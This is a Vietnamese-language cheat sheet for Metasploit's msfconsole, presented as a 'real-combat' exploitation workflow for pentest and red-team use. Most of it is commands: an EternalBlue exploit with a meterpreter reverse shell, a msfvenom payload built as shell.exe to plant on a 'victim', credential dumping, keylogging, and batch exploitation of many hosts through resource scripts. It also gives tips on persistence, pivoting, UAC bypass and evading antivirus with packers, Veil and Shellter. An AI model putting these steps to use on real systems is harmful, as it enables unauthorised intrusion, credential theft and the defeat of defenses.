1. msfconsole là gì?

    msfconsole là giao diện dòng lệnh (CLI) mạnh nhất, phổ biến nhất của Metasploit Framework.

    Dùng để:

        Khai thác lỗ hổng (exploit)

        Tạo payload, gửi payload, quản lý phiên khai thác (session)

        Post-exploitation: nâng quyền, dump hash, pivot, duy trì truy cập...

        Automation scripting, báo cáo, module dev

    CLI đầy đủ, giống msfconsole trên Kali, Ubuntu, macOS, Windows, WSL...

2. Khởi động msfconsole & giao diện

sudo msfconsole

    Sẽ hiện banner "Metasploit" + prompt msf6 > (hoặc msf > tuỳ version)

    Đã tích hợp tất cả các module, lệnh, scripting automation, API msfvenom.

3. Các lệnh cơ bản trong msfconsole
Lệnh	Ý nghĩa
help	Hiện tất cả lệnh hỗ trợ
search <từ khóa>	Tìm module (exploit/payload/aux/post) theo tên hoặc CVE
use <tên module>	Chọn module exploit, payload, auxiliary, post-exploit...
show exploits	Liệt kê exploit có sẵn
show payloads	Liệt kê tất cả payload
show auxiliary	Liệt kê auxiliary (scan, fuzz, brute-force, dos, enum...)
show options	Xem option module đang chọn
set <option> <giá trị>	Đặt giá trị cho option
run hoặc exploit	Thực thi module đã chọn
sessions	Liệt kê session đang active
sessions -i <id>	Tương tác với session (meterpreter, shell, ...)
background	Đưa session về background
jobs	Liệt kê các job đang chạy
kill <job id>	Dừng 1 job
exit	Thoát msfconsole
4. Workflow khai thác thực chiến với msfconsole
A. Tìm module exploit

search smb
search cve:2017-0144

B. Chọn module & xem tuỳ chọn

use exploit/windows/smb/ms17_010_eternalblue
show options

C. Thiết lập các tham số cần thiết

set RHOSTS 192.168.1.101
set LHOST 192.168.1.10   # IP máy bạn
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LPORT 4444           # Port nhận kết nối reverse

D. Thực thi khai thác

run
# Hoặc: exploit

E. Quản lý phiên khai thác (session)

sessions         # Hiện tất cả phiên đã khai thác được
sessions -i 1    # Tương tác với session 1

F. Post-exploitation (trên Meterpreter session)

sysinfo
getuid
hashdump
getsystem
screenshot
keyscan_start
download /etc/passwd
upload evil.exe

    Có thể chạy module post-exploitation:

    use post/windows/gather/credentials/enum_logged_on_users
    set SESSION 1
    run

5. Tạo và sử dụng payload (msfvenom trong msfconsole)

    Có thể dùng msfvenom ngoài hoặc dùng trực tiếp handler trong msfconsole:

use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP bạn>
set LPORT 4444
run

Dùng msfvenom để tạo payload ngoài:

    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe > shell.exe

    Tải lên máy victim, chờ kết nối về handler.

6. Scripting & automation với msfconsole
A. Resource script (.rc)

    Tạo file auto.rc:

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.101
set LHOST 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

Chạy tự động:

    msfconsole -r auto.rc

B. Batch exploit nhiều host

    Dùng set RHOSTS file:targets.txt (mỗi dòng 1 IP/host).

    Có thể dùng run -j (background job) để khai thác song song.

C. Automation report

    Dùng lệnh loot, creds, tự động log output, generate report CSV.

7. Module nâng cao & trick mạnh

    Pivoting: dùng meterpreter portfwd, autoroute, scan LAN nội bộ, tấn công các máy khác từ victim.

    Lateral movement: các module như exploit/windows/smb/psexec, post/windows/manage/...

    Persistence: giữ kết nối khi victim reboot (post/windows/manage/persistence).

    Bypass UAC: các module bypassuac, getsystem, exploit LPE...

    Post-exploitation đa nền tảng: post/linux/gather/, post/multi/gather/...

8. Fix lỗi thường gặp
Lỗi	Fix
Không vào được msfconsole	Update/cài lại, check permission, check ruby/python version
Không exploit được	Kiểm tra version OS, port, firewall, AV/EDR, option đã đúng chưa
Không có session	LHOST/LPORT sai, NAT không forward, payload bị chặn
AV detect payload	Dùng encode, packer, Veil, Shellter, đổi kiểu payload
Shell không ổn định	Thử meterpreter stageless, đổi port, tăng timeout
Không lên quyền	Thử getsystem, LPE module, printspoofer, post-exploit khác
Không tải file được	Check permission, antivirus, set working dir
Không chạy được job song song	Dùng -j, kiểm tra resource, chia nhỏ batch
9. Mẹo mạnh & best-practice thực chiến

    Tích hợp msfconsole với Nmap, Vulners, AutoRecon để phát hiện và tự động exploit.

    Sử dụng các lệnh search nâng cao:

        search type:exploit platform:windows

        search name:struts2

    Viết script post-exploit custom (Ruby, bash, python) để tự động hóa workflow, report.

    Kết hợp với Empire, Cobalt Strike, Covenant để mở rộng attack chain.

    Backup các session, loot, log, dùng msfdb để quản lý lâu dài.

    Sử dụng Web UI (Metasploit Community/Pro) nếu thích giao diện đồ hoạ!

10. Tài liệu, link hữu ích

    Metasploit Docs

    Metasploit Unleashed (OffSec)

    Hacktricks Metasploit

    PayloadAllTheThings – Post Exploit

    Awesome Metasploit

    Veil Framework

    Shellter

Tóm tắt nhanh

    msfconsole: CLI mạnh nhất cho pentest/red team/CTF, hỗ trợ scan, exploit, tạo payload, brute-force, post-exploit, pivot, persistence, scripting, automation, reporting.

    Nên script hóa các workflow lặp, tận dụng resource script, batch exploit, custom module.

    Kết hợp aircrack-ng, Empire, hashcat, cobalt strike, armitage để hoàn thiện workflow pentest.